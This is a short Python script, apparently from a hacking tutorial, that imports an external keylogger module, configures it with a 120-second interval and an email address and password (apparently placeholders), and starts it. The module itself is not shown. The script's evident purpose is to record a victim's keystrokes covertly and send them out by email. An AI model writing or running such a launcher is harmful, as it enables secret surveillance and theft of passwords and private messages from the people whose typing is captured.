#!/usr/bin/env python

import keylogger

my_keylogger =keylogger.KeyLogger(120, "correo@gmail.com", "Contrasena")
my_keylogger.start()